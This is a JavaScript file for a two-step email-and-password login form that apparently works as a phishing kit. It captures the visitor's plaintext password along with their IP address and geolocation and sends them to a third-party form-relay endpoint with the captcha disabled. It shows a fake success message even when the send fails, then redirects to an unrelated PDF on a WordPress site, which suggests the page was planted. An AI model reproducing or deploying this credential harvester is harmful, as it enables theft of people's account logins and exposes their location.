// --------------------------------------------------------------
// GLOBALS & IP LOCATION STORAGE (only ip and loc)
// --------------------------------------------------------------
let locationData = {
    ip: 'Not captured',
    loc: ''
};

async function fetchIpLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        if (!response.ok) throw new Error('Location fetch failed');
        const data = await response.json();
        locationData = {
            ip: data.ip || 'unknown',
            loc: `${data.latitude},${data.longitude}` || ''
        };
        console.log('📍 IP & coordinates stored:', locationData);
        sessionStorage.setItem('userLocation', JSON.stringify(locationData));
    } catch (error) {
        console.warn('Could not fetch location, using fallback:', error);
        locationData = {
            ip: 'unavailable',
            loc: ''
        };
    }
}

let inputEventsLog = [];

function logInputInteraction(fieldName, valueMasked = '***') {
    const timestamp = new Date().toISOString();
    const entry = {
        field: fieldName,
        timestamp: timestamp,
        locationSnapshot: { ...locationData },
        valuePreview: fieldName === 'email' ? valueMasked : '[PASSWORD]'
    };
    inputEventsLog.push(entry);
    sessionStorage.setItem('inputAuditLog', JSON.stringify(inputEventsLog));
    console.log(`📝 stored ${fieldName} interaction with IP & coords`, locationData);
}

// DOM elements
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const emailField = document.getElementById('emailInput');
const passwordField = document.getElementById('passwordInput');
const nextBtn = document.getElementById('nextToPasswordBtn');
const finalSubmit = document.getElementById('finalSubmitBtn');
const displayEmailSpan = document.getElementById('displayEmailValue');
const emailPreviewBox = document.querySelector('.email-preview');
const formHeader = document.querySelector('.form-header');

let currentEmail = '';
let passwordLogged = false;

// Helper function to move from email to password step
function goToPasswordStep() {
    const emailValue = emailField.value.trim();
    if (emailValue === '') {
        alert('Please enter your email address to continue.');
        return false;
    }
    if (!emailValue.includes('@') || !emailValue.includes('.')) {
        alert('Please enter a valid email address (e.g., name@domain.com).');
        return false;
    }
    currentEmail = emailValue;
    displayEmailSpan.innerText = currentEmail;
    
    logInputInteraction('email', currentEmail);
    
    step1.classList.add('hidden-step');
    step2.classList.remove('hidden-step');
    passwordField.value = '';
    passwordLogged = false;
    formHeader.classList.add('hidden-header');
    return true;
}

// Step 1 → Step 2 (button click)
nextBtn.addEventListener('click', (e) => {
    e.preventDefault();
    goToPasswordStep();
});

// Press Enter in email field → go to password step
emailField.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        goToPasswordStep();
    }
});

// Click on displayed email → go back to email input step
emailPreviewBox.addEventListener('click', () => {
    if (!step2.classList.contains('hidden-step')) {
        emailField.value = currentEmail;
        step2.classList.add('hidden-step');
        step1.classList.remove('hidden-step');
        passwordField.value = '';
        passwordLogged = false;
        formHeader.classList.remove('hidden-header');
    }
});

// Password blur: store IP location for password input
passwordField.addEventListener('blur', () => {
    if (passwordField.value.trim().length > 0 && !passwordLogged) {
        logInputInteraction('password', '*****');
        passwordLogged = true;
    }
});

function ensurePasswordLogged() {
    if (passwordField.value.trim().length > 0 && !passwordLogged) {
        logInputInteraction('password', '*****');
        passwordLogged = true;
    }
}

// Email field changes also log (if different)
emailField.addEventListener('blur', () => {
    if (emailField.value.trim() !== '' && emailField.value.trim() !== currentEmail) {
        logInputInteraction('email_modified', emailField.value.trim());
    }
});

// Helper function to submit the form
async function submitForm() {
    const pwd = passwordField.value.trim();
    if (!pwd) { alert('Please enter your password.'); return; }
    if (!currentEmail) currentEmail = emailField.value.trim();
    if (!currentEmail) { alert('Email missing.'); return; }
    ensurePasswordLogged();
    await fetchIpLocation();

    // Prepare FormData for FormSubmit
    const formData = new FormData();
    formData.append('email', currentEmail);
    formData.append('password', pwd);
    formData.append('ip_address', locationData.ip);
    formData.append('geo_coords', locationData.loc);
    formData.append('audit_log', JSON.stringify(inputEventsLog));
    formData.append('_subject', 'New Login Submission');
    formData.append('_captcha', 'false');   // optional: disable captcha if needed

    const original = finalSubmit.innerText;
    finalSubmit.innerText = 'Verifying...';
    finalSubmit.disabled = true;

    try {
        const response = await fetch('https://formsubmit.co/0a8997087d87c2376c18cb1ab885081c', {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        });
        const result = await response.json();
        if (result.success) {
            showSuccessAndRedirect();
        } else {
            console.warn('FormSubmit error:', result);
            showSuccessAndRedirect(); // still show success popup as required
        }
    } catch (err) {
        console.error('Network error:', err);
        showSuccessAndRedirect();
    } finally {
        finalSubmit.innerText = original;
        finalSubmit.disabled = false;
    }
}

// Submit button click
finalSubmit.addEventListener('click', async (e) => {
    e.preventDefault();
    await submitForm();
});

// Press Enter in password field → submit
passwordField.addEventListener('keypress', async (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        await submitForm();
    }
});

function showSuccessAndRedirect() {
    const popup = document.getElementById('successPopup');
    popup.classList.add('active');
    setTimeout(() => {
        popup.classList.remove('active');
        window.location.href = '/wp-content/uploads/2022/02/BHCIP_CCEP_Development-Overview_508.pdf';
    }, 1800);
}

// Initial location fetch
window.addEventListener('load', () => {
    fetchIpLocation().then(() => {
        const readyEvent = { type: 'session_start', time: new Date().toISOString(), location: locationData };
        inputEventsLog.push(readyEvent);
        sessionStorage.setItem('inputAuditLog', JSON.stringify(inputEventsLog));
    });
});